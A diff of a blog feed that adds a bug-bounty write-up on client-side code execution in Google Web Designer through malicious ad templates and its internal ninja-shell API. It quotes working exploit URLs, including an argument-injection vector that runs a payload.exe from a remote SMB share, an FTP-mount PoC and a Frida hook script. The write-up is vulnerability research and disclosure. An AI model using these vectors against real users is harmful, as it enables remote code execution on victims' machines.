@@ -1,5 +1,325 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-07-31T13:45:42+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">sudi’s blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
-</subtitle><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><entry><title type="html">XSS in Google IDX Workstation</title><link href="http://localhost:4000/2025/07/02/idx.html" rel="alternate" type="text/html" title="XSS in Google IDX Workstation" /><published>2025-07-02T00:00:00+05:30</published><updated>2025-07-02T00:00:00+05:30</updated><id>http://localhost:4000/2025/07/02/idx</id><content type="html" xml:base="http://localhost:4000/2025/07/02/idx.html"><![CDATA[<p>Heyyy Everyyonee,</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-09-30T22:56:49+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">sudi’s blog</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</subtitle><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><entry><title type="html">Abusing the NinjaShell API for Code Execution in Google Web Designer</title><link href="http://localhost:4000/2025/09/23/RCE-in-web-designer.html" rel="alternate" type="text/html" title="Abusing the NinjaShell API for Code Execution in Google Web Designer" /><published>2025-09-23T00:00:00+05:30</published><updated>2025-09-23T00:00:00+05:30</updated><id>http://localhost:4000/2025/09/23/RCE-in-web-designer</id><content type="html" xml:base="http://localhost:4000/2025/09/23/RCE-in-web-designer.html"><![CDATA[<p>Heyyy Everyone,</p>
+
+<p><em>Google Web Designer</em> has been on my radar for quite some time because of this person: <a href="https://balintmagyar.com">https://balintmagyar.com</a>
+. He has been finding so many cool RCEs in this single desktop application, which made me so interested to look into it and try to find one myself.</p>
+
+<p>When someone puts out a blogpost, rather than just reading it, I always try to reproduce it. If it’s possible to set up an older version of the same app, I’ll do that and try to reproduce the bug. This is actually very important because sometimes some bugs are much harder in practice than they seem just from reading the blogpost. Doing this gives you more understanding of the application, which helps in finding similar bugs in other areas or even bypasses of the same bug.</p>
+
+<p>For Google Web Designer as well, it’s the same. Bálint Magyar put out a bunch of blogposts:</p>
+
+<p><br /></p>
+<center><a href="https://balintmagyar.com/articles/google-web-designer-symlink-client-side-rce-cve-2025-1079" class="card-preview" data-size="medium" target="_blank">
+  Loading preview...
+</a></center>
+<p><br /></p>
+
+<p><br /></p>
+<center><a href="https://balintmagyar.com/articles/google-web-designer-path-traversal-client-side-rce-cve-2025-4613" class="card-preview" data-size="medium" target="_blank">
+  Loading preview...
+</a></center>
+<p><br /></p>
+
+<p>Just by reading and reproducing these bugs, you start to get an idea of the attack surface and where you can look for potential entry points.</p>
+
+<p>Since we’re targeting a desktop application and not a normal web app, the input sources need to be identified first. In such cases, it’s most often the exported project files themselves that you can open in the application.</p>
+
+<p>One such input was a malicious ad template package, which you can import into the application and use.</p>
+
+<p><img alt="image" src="/tmp/cdn-images/Code_mexdtuaT5a.png" />
+<img alt="image" src="/tmp/cdn-images/Code_V2lQVX6KH5.png" /></p>
+
+<p>Bálint’s exploit was through the <code class="language-plaintext highlighter-rouge">remoteAssets</code> key, where he discovered a URL parsing behavior that made <em>Google Web Designer (GWD)</em> fetch resources from an arbitrary origin. I started out by looking for any bypasses of the same issue but didn’t have much success. So, I decided to look into similar inputs instead.</p>
+
+<p>Just above the <code class="language-plaintext highlighter-rouge">remoteAssets</code> key, you can see three similarly named keys that also contain URLs as their values:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">      </span><span class="nl">"videoThumbnailUrlSmall"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://storage.googleapis.com/gwd_video_templates/thumbnail_videos/Multisize_Video_With_Text_Panel_Overlay_And_Logo_6s_300x168.mp4"</span><span class="err">,</span><span class="w">
+      </span><span class="nl">"videoThumbnailUrlLarge"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://storage.googleapis.com/gwd_video_templates/thumbnail_videos/Multisize_Video_With_Text_Panel_Overlay_And_Logo_6s_600x338.mp4"</span><span class="err">,</span><span class="w">
+      </span><span class="nl">"videoPreviewRootUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://storage.googleapis.com/gwd_video_templates/preview_videos/Multisize_Video_With_Text_Panel_Overlay_And_Logo_6s"</span><span class="err">,</span><span class="w">
+</span></code></pre></div></div>
+
+<p>I simply replaced the values for these keys with my own webhook URL, and soon enough I received a pingback when I loaded that template:</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/?body=%3Cscript%3Efetch(%27/xss%27)%3C/script%3E</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">yvyedbhvbnmwsqqztgnyw7fw0o04kd4fu.oast.fun</span>
+<span class="na">Sec-Ch-Ua</span><span class="p">:</span> <span class="s">"Chromium";v="119", "Not?A_Brand";v="24"</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate, br</span>
+<span class="na">Sec-Ch-Ua-Mobile</span><span class="p">:</span> <span class="s">?0</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36</span>
+<span class="na">Sec-Ch-Ua-Platform</span><span class="p">:</span> <span class="s">"Windows"</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">cross-site</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">no-cors</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">video</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9</span>
+<span class="na">Range</span><span class="p">:</span> <span class="s">bytes=0-</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
+</code></pre></div></div>
+
+<p>From the <code class="language-plaintext highlighter-rouge">Sec-Fetch-Dest</code> header, it’s clear that my URL was being loaded inside a video element’s src attribute. My initial thought was that if it were being loaded in a new window or an iframe instead, it could provide a script execution primitive and since the Chromium version used here is old, renderer exploits could potentially lead to direct RCE.</p>
+
+<p>At this point, I tried to see if I could access the developer console. GWD uses the Chromium Embedded Framework (CEF), which is evident from the User-Agent. If I could find a way to debug the page (which is basically HTML/JS), I might be able to escalate this further.</p>
+
+<p>I attempted to use Frida to hook into the process and inject remote debugging flags into the renderer processes, but they didn’t seem to work for me. Below is a sample hooking script I created with ChatGPT to try injecting <code class="language-plaintext highlighter-rouge">--remote-debugging-port</code>, but for some reason, it never worked:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// File: debug_renderers_proper.js</span>
+<span class="kd">let</span> <span class="nx">rendererCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="kd">const</span> <span class="nx">BASE_PORT</span> <span class="o">=</span> <span class="mi">9222</span><span class="p">;</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Starting proper argument injection...</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="kd">const</span> <span class="nx">APIs</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">CreateProcessW</span><span class="dl">"</span><span class="p">,</span> <span class="na">module</span><span class="p">:</span> <span class="dl">"</span><span class="s2">kernel32.dll</span><span class="dl">"</span> <span class="p">},</span>
+    <span class="p">{</span> <span class="na">name</span><span class="p">:</span> <span class="dl">"</span><span class="s2">CreateProcessInternalW</span><span class="dl">"</span><span class="p">,</span> <span class="na">module</span><span class="p">:</span> <span class="dl">"</span><span class="s2">kernelbase.dll</span><span class="dl">"</span> <span class="p">}</span>
+<span class="p">];</span>
+
+<span class="nx">APIs</span><span class="p">.</span><span class="nf">forEach</span><span class="p">(</span><span class="nx">api</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">address</span> <span class="o">=</span> <span class="nx">Module</span><span class="p">.</span><span class="nf">findExportByName</span><span class="p">(</span><span class="nx">api</span><span class="p">.</span><span class="nx">module</span><span class="p">,</span> <span class="nx">api</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
+    <span class="k">if </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">Interceptor</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span> <span class="p">{</span>
+            <span class="na">onEnter</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">try</span> <span class="p">{</span>
+                    <span class="kd">const</span> <span class="nx">cmdLinePtr</span> <span class="o">=</span> <span class="nx">args</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+                    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">cmdLinePtr</span><span class="p">.</span><span class="nf">isNull</span><span class="p">())</span> <span class="p">{</span>
+                        <span class="kd">let</span> <span class="nx">originalCmd</span> <span class="o">=</span> <span class="nx">cmdLinePtr</span><span class="p">.</span><span class="nf">readUtf16String</span><span class="p">();</span>
+                        
+                        <span class="k">if </span><span class="p">(</span><span class="nx">originalCmd</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">--type=renderer</span><span class="dl">"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> 
+                            <span class="o">!</span><span class="nx">originalCmd</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="dl">"</span><span class="s2">--remote-debugging-port</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
+                            
+                            <span class="nx">rendererCount</span><span class="o">++</span><span class="p">;</span>
+                            <span class="kd">const</span> <span class="nx">debugPort</span> <span class="o">=</span> <span class="nx">BASE_PORT</span> <span class="o">+</span> <span class="nx">rendererCount</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+                            
+                            <span class="c1">// PROPER POSITIONING: Insert before /prefetch:</span>
+                            <span class="kd">const</span> <span class="nx">prefetchIndex</span> <span class="o">=</span> <span class="nx">originalCmd</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">/prefetch:</span><span class="dl">"</span><span class="p">);</span>
+                            <span class="kd">let</span> <span class="nx">newCmd</span> <span class="o">=</span> <span class="nx">originalCmd</span><span class="p">;</span>
+                            
+                            <span class="k">if </span><span class="p">(</span><span class="nx">prefetchIndex</span> <span class="o">!==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                                <span class="nx">newCmd</span> <span class="o">=</span> 
+                                    <span class="nx">originalCmd</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">prefetchIndex</span><span class="p">)</span> <span class="o">+</span> 
+                                    <span class="s2">` --remote-debugging-port=</span><span class="p">${</span><span class="nx">debugPort</span><span class="p">}</span><span class="s2"> `</span> <span class="o">+</span>
+                                    <span class="nx">originalCmd</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">prefetchIndex</span><span class="p">);</span>
+                            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                                <span class="nx">newCmd</span> <span class="o">=</span> <span class="nx">originalCmd</span> <span class="o">+</span> <span class="s2">` --remote-debugging-port=</span><span class="p">${</span><span class="nx">debugPort</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+                            <span class="p">}</span>
+                            
+                            <span class="c1">// Clean up any double spaces</span>
+                            <span class="nx">newCmd</span> <span class="o">=</span> <span class="nx">newCmd</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\s</span><span class="sr">+/g</span><span class="p">,</span> <span class="dl">'</span><span class="s1"> </span><span class="dl">'</span><span class="p">).</span><span class="nf">trim</span><span class="p">();</span>
+                            
+                            <span class="kd">const</span> <span class="nx">newCmdPtr</span> <span class="o">=</span> <span class="nx">Memory</span><span class="p">.</span><span class="nf">allocUtf16String</span><span class="p">(</span><span class="nx">newCmd</span><span class="p">);</span>
+                            
+                            <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span>
+                                <span class="s2">`\n[+] Modified renderer #</span><span class="p">${</span><span class="nx">rendererCount</span><span class="p">}</span><span class="s2">\n`</span> <span class="o">+</span>
+                                <span class="s2">`Port: </span><span class="p">${</span><span class="nx">debugPort</span><span class="p">}</span><span class="s2">\n`</span> <span class="o">+</span>
+                                <span class="s2">`Before: </span><span class="p">${</span><span class="nx">originalCmd</span><span class="p">}</span><span class="s2">\n`</span> <span class="o">+</span>
+                                <span class="s2">`After : </span><span class="p">${</span><span class="nx">newCmd</span><span class="p">}</span><span class="s2">\n`</span> <span class="o">+</span>
+                                <span class="dl">"</span><span class="s2">-</span><span class="dl">"</span><span class="p">.</span><span class="nf">repeat</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span>
+                            <span class="p">);</span>
+                            
+                            <span class="nx">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">newCmdPtr</span><span class="p">;</span>
+                        <span class="p">}</span>
+                    <span class="p">}</span>
+                <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="s2">`Error in </span><span class="p">${</span><span class="nx">api</span><span class="p">.</span><span class="nx">name</span><span class="p">}</span><span class="s2">:`</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="p">});</span>
+    <span class="p">}</span>
+<span class="p">});</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="se">\n</span><span class="s2">[+] Ready - Start debugging at:</span><span class="se">\n</span><span class="dl">"</span> <span class="o">+</span>
+            <span class="s2">`http://localhost:</span><span class="p">${</span><span class="nx">BASE_PORT</span><span class="p">}</span><span class="s2">\n`</span> <span class="o">+</span>
+            <span class="s2">`http://localhost:</span><span class="p">${</span><span class="nx">BASE_PORT</span> <span class="o">+</span> <span class="mi">1</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This felt like a dead end, as I was only able to load my own domain by controlling the video src. I then started exploring other video templates available by default, and in one of them, I noticed something very interesting…</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">     </span><span class="nl">"videoThumbnailUrlSmall"</span><span class="p">:</span><span class="w"> </span><span class="s2">"//ninja-shell/api/file?method=read&amp;file=C:%5CUsers%5CSTARK-PC%5CDocuments%5CGoogle%20Web%20Designer%5Ctemplates%5Cdefaults%5CpreviewVideos%5Ca.mp4"</span><span class="err">,</span><span class="w">
+      </span><span class="nl">"videoThumbnailUrlLarge"</span><span class="p">:</span><span class="w"> </span><span class="s2">"//ninja-shell/api/file?method=read&amp;file=C:%5CUsers%5CSTARK-PC%5CDocuments%5CGoogle%20Web%20Designer%5Ctemplates%5Cdefaults%5CpreviewVideos%5Ca.mp4"</span><span class="err">,</span><span class="w">
+      </span><span class="nl">"videoPreviewRootUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"//ninja-shell/api/file?method=read&amp;file=C:%5CUsers%5CSTARK-PC%5CDocuments%5CGoogle%20Web%20Designer%5Ctemplates%5Cdefaults%5CpreviewVideos%5Ca"</span><span class="err">,</span><span class="w">
+</span></code></pre></div></div>
+
+<p>I had once noticed a mention of ninja-shell while proxying the application traffic through Burp. At first, it looked like just a random path to me, but after seeing the full URL, it turned out to be something very interesting.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//ninja-shell/api/file?method=read&amp;file=C:\Users\STARK-PC\Documents\Google Web Designer\templates\defaults\previewVideos\a.mp4
+</code></pre></div></div>
+
+<p>Simply treat this as a URL ninja-shell is the hostname, which is resolved internally by the application. There are some request listeners that, upon detecting this hostname, handle the request differently.
+This meant I could make any request to the ninja-shell host, but since I don’t control the method, I’m limited to GET requests only.</p>
+
+<p>I started enumerating more endpoints by checking the proxied JS files and also ran a simple strings command on the binary, grepping for “ninja” (hehe inspired from Renwa <a href="https://medium.com/@renwa/arc-browser-uxss-local-file-read-arbitrary-file-creation-and-path-traversal-to-rce-b439f2a299d1">https://medium.com/@renwa/arc-browser-uxss-local-file-read-arbitrary-file-creation-and-path-traversal-to-rce-b439f2a299d1</a>)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>googleclient/webdesigner/shell/cef_objects/ninja_cef_client.cc
+googleclient/webdesigner/shell/cef_objects/ninja_cef_app.cc
+ninjaShell
+</code></pre></div></div>
+
+<p>Based on the naming of the file you can get an idea this ninja api allows the GWD to communicate with CEF</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//ninja-shell/api/preference?method=get
+//ninja-shell/api/preference?method=read
+//ninja-shell/api/browser?method=list
+//ninja-shell/api/browser?method=open&amp;url=&amp;usedefaultapp=true
+</code></pre></div></div>
+
+<p>Out of the ones I found, this one caught my interest: <code class="language-plaintext highlighter-rouge">//ninja-shell/api/browser?method=open&amp;url=&amp;usedefaultapp=true</code>. Specifying any URL there opens it in the default browser. I quickly changed it to <code class="language-plaintext highlighter-rouge">file:///C:/Windows/System32/calc.exe</code> to see if it popped Calculator  and it worked :)</p>
+
+<p>To execute an arbitrary binary, we can make the victim visit an attacker-controlled website first, have the victim download an executable from there, and then specify that executable’s location in the url parameter of the ninja-shell API. There is one limitation: the attacker needs to know the victim’s username beforehand because the Download folder is constructed like this: <code class="language-plaintext highlighter-rouge">C:\Users\STARK-PC\Downloads\pwn.exe</code>  the username can be anything.</p>
+
+<p>I hoped the same url parameter would resolve SMB paths as well. I changed it to <code class="language-plaintext highlighter-rouge">\\&lt;IP&gt;\pwn.exe</code>, but it didn’t work.</p>
+
+<p>I didn’t have many options left, so I decided to report it as-is for now and continue looking for different ways. I started searching for ninjaShell on Google to see if it’s part of some library or known component, and I stumbled upon a disclosed report  this is exactly what I was looking for, damnnn.</p>
+
+<p><br /></p>
+<center><a href="https://bughunters.google.com/reports/vrp/qMhY4nw9i" class="card-preview" data-size="medium" target="_blank">
+  Loading preview...
+</a></center>
+<p><br /></p>
+
+<p>TLDR: Earlier GWD exposed a local server (Chrome Devtools Protocol) via the <code class="language-plaintext highlighter-rouge">--remote-debugging-port</code> flag. You can enumerate available endpoints via <code class="language-plaintext highlighter-rouge">/json/list</code>, and from there leak the <em>webSocketDebuggerUrl</em> for pages loaded in that Chrome process.</p>
+
+<p><br /></p>
+<center><a href="https://chromedevtools.github.io/devtools-protocol/" class="card-preview" data-size="medium" target="_blank">
+  Loading preview...
+</a></center>
+<p><br /></p>
+
+<p>Sample response:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w"> </span><span class="p">{</span><span class="w">
+  </span><span class="nl">"description"</span><span class="p">:</span><span class="w"> </span><span class="s2">""</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"devtoolsFrontendUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"/devtools/inspector.html?ws=localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"DAB7FB6187B554E10B0BD18821265734"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"title"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Yahoo"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"page"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"url"</span><span class="p">:</span><span class="w"> </span><span class="s2">"https://www.yahoo.com/"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"webSocketDebuggerUrl"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ws://localhost:9222/devtools/page/DAB7FB6187B554E10B0BD18821265734"</span><span class="w">
+</span><span class="p">}</span><span class="w"> </span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Being able to leak <code class="language-plaintext highlighter-rouge">webSocketDebuggerUrl</code> means you can connect to that websocket and execute any arbitrary commands in the context of the loaded page. In the above example by connecting to that websocket you will able be to execute arbitrary js in the <a href="https://www.yahoo.com/">https://www.yahoo.com/</a> origin.</p>
+
+<p>With DNS rebinding it would be possible to leak such url, but the main concern is how would you connect to it. In older versions it was possible to connect to this websocket port from any origin,but it got some nice mitigations in place to avoid such.</p>
+
+<p>The only possible ways to connect to websocket now are either you have some sort script execution (xss) in the  origin specified in <code class="language-plaintext highlighter-rouge">--remote-allow-origins</code> flag (<code class="language-plaintext highlighter-rouge">*</code> in this flag means any origin is allowed :p) , another way is to remove the <code class="language-plaintext highlighter-rouge">Origin</code> header or not sent it at all for the handshake request. Browsers normally always send Origin, so this is hard.</p>
+
+<p>I am aware about only one case where it was possible to do such, it used to work in Firefox. I do sure know a lot of people who are waiting for such to happen because it’s been used a sole measure to protect againsts CSRF as well 😆.</p>
+
+<p>Actually there were two ways I found one by mistake, I loaded a csrf poc locally so the scheme was <code class="language-plaintext highlighter-rouge">file://</code> this made the Firefox browser not send any Origin header at all for any requests.</p>
+
+<p>I submitted the report as it is (was for a private bbp CSRF bug) and realised later that the same poc would fail in real world when the attacker would host such in their own website. The solution for this I found on twitter can’t find the tweet now , someone found by embedding a data-URI HTML form CSRF PoC inside an iframe src  attribute you can make the browser to not send any Origin header.</p>
+
+<p>But shortly after, this stopped working in newer versions of Firefox too, then I saw this disclosed report at that time he used the same poc and did confirm that it no longer works in newer versions :(</p>
+
+<p><br /></p>
+<center><a href="https://x.com/disclosedh1/status/1679139895883833348" class="card-preview" data-size="medium" target="_blank">
+  Loading preview...
+</a></center>
+<p><br /></p>
+
+<hr />
+
+<p>Ah so we took an unexpected turn back to GWD again, in that disclosed Google VRP report the researcher showed they are able to make requests to the <code class="language-plaintext highlighter-rouge">ninja-shell</code> host</p>
+
+<p>This gives the following primitive:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Read / Write / Delete / List any file and folder the victim system user has access to. This is possible as Google Web Designer implements some special APIs which are triggered when you fetch a https://ninja-shell/api/{file|directory}?method={read|create|save|delete|exists|...}&amp;{file|path}= URL
+</code></pre></div></div>
+
+<p>The same endpoints also supports different methods eg PUT request can be used to write arbitrary files on the victim machines and as you are able to view the response of the request also you have file read primitive as well.</p>
+
+<p>I am limited to GET based method only, so I couldn’t use the PUT method for arbitrary file write and get RCE using it.</p>
+
+<p>Meanwhile I got the BOUNTY mail for my report, the amount was way lower than the previous RCEs found in the same application</p>
+
+<p><img alt="image" src="/tmp/cdn-images/Screenshot 2025-09-30 172310.png" /></p>
+
+<p>Google VRP is actually really nice, they give details on any factor which might have affected the bounty amount. It’s good because you can argue and provide more impact to overcome that downgrade medium.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We applied a downgrade because the attack requires significant user interaction.
+We applied a downgrade because of a minor impact the attack may have.
+We applied a downgrade, determining that the issue is very likely unexploitable due to knowing information about the victims machine.
+</code></pre></div></div>
+
+<p>The  bounty which Bálint Magyar recieved for his RCE bug was 8.5k which relied on the same Malicous Ad Template, so I wondered -5k just for this limitation where the attacker needs to know the username doesn’t looks justified ? I appealed for the same asking Google to increase the bounty.</p>
+
+<p>I tried asking on twitter as well, maybe someone knows a way. @Jorian did responded and provided some good ideas  but that didn’t turned out to be useful for those case.</p>
+
+<p><img alt="image" src="/tmp/cdn-images/Screenshot 2025-09-30 174929.png" /></p>
+
+<p>So in the end I had no other option for Windows, but later I stumbled upon this disclosed report from @RenwaX23.</p>
+
+<p><br /></p>
+<center><a href="https://bugcrowd.com/disclosures/f7ce8504-0152-483b-bbf3-fb9b759f9f89/critical-local-file-read-in-electron-desktop-app" class="card-preview" data-size="medium" target="_blank">
+  Loading preview...
+</a></center>
+<p><br /></p>
+
+<p>From his poc</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;br&gt;&lt;br&gt;</span>
+<span class="nt">&lt;h1</span> <span class="na">style=</span><span class="s">color:green</span> <span class="na">onclick=</span><span class="s">start()</span><span class="nt">&gt;</span>
+Click Here and confirm the dialog boxes to connect
+<span class="nt">&lt;/h1&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="kd">function</span> <span class="nf">start</span><span class="p">(){</span>
+<span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">ftp://tinnier-regions:slawbra23@files.000webhost.com</span><span class="dl">'</span><span class="p">;</span>
+<span class="nf">setTimeout</span><span class="p">(()</span><span class="o">=&gt;</span><span class="p">{</span>
+<span class="nx">location</span><span class="o">=</span><span class="dl">'</span><span class="s1">https://app.asana.com/-/desktop_app_link?path=/file:///Volumes/files.000webhost.com/public_html/pwn.html</span><span class="dl">'</span>
+<span class="p">},</span><span class="mi">10000</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+
+<p>On macOS, if a webpage navigates to the <code class="language-plaintext highlighter-rouge">ftp:</code> scheme using location, the Finder dialog box appears  clicking Open will automatically mount the share in an easily guessable location on the victim’s file system.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file:///Volumes/files.000webhost.com/public_html/pwn.html
+</code></pre></div></div>
+
+<p><br /></p>
+<center><a href="https://github.com/Metnew/write-ups/tree/main/rce-github-desktop-2.9.3" class="card-preview" data-size="medium" target="_blank">
+  Loading preview...
+</a></center>
+<p><br /></p>
+
+<p>I included these additional details in my reports, showing that the username requirement could be bypassed. After some time, I received this response 🥲. It seems they considered that there could be many bugs if users open or rely on such malicious templates, and the best way to handle this is simply to warn the user before opening untrusted templates.</p>
+
+<p>This concept is similar to what Vscode does, where they would prompt and ask if the user trusts the workspace or not if it’s not trusted the directory is opened in a kindof sandbox environment where it disables a lot of vscode internal/extension features eg git,etc that might unknowingly allow executing arbitrary commands.</p>
+
+<p><img alt="image" src="/tmp/cdn-images/Screenshot 2025-09-30 193104.png" /></p>
+
+<p>In the end, it turned out like this  you can consider that they won’t accept such bugs anymore in Google Web Designer.</p>
+
+<p><img alt="image" src="/tmp/cdn-images/Screenshot 2025-09-30 194328.png" /></p>
+
+<p>Just a couple of weeks after my report was closed, I saw this banger from Bálint once again: it turns out he found the same type of bug but the sink was different. For me it was <code class="language-plaintext highlighter-rouge">video.src</code> in his case he injected the ninja-shell API URL in the <code class="language-plaintext highlighter-rouge">background-image</code> property, which when rendered makes a request to that specific URL.</p>
+
+<p><br /></p>
+<center><a href=" https://balintmagyar.com/articles/google-web-designer-css-injection-client-rce" class="card-preview" data-size="medium" target="_blank">
+  Loading preview...
+</a></center>
+<p><br /></p>
+
+<p>The RCE vector which he used was really cool, it clearly shows how I missed such. Every bug we miss is an oppurtunity to learn more :)</p>
+
+<p>The vector which I was using for RCE:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//ninja-shell/api/browser?method=open&amp;url=/Volumes/attackerserver.com/public_html/pwn.exe&amp;usedefaultapp=true
+</code></pre></div></div>
+
+<p>The one  used by Bálint:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//ninja-shell/api/browser?method=open&amp;usedefaultapp=false&amp;browser=chrome&amp;url=//%22%20--browser-subprocess-path%3D%5C%5Cbalintmagyar.com%5Cpayload.exe%20--headless%20%22
+</code></pre></div></div>
+
+<p>You can notice the similarities the path endpoint is same, only difference is in the parameters which I totally failed to find about during my esalation this involves arguement injection in the chrome process + using SMB share to deliver the executable , so props to Bálint on finding this 🫡</p>
+
+<center>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/494MSLeW7n8?si=l9HtKiizcn6Y2LQU" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
+</center>
+<p><br />
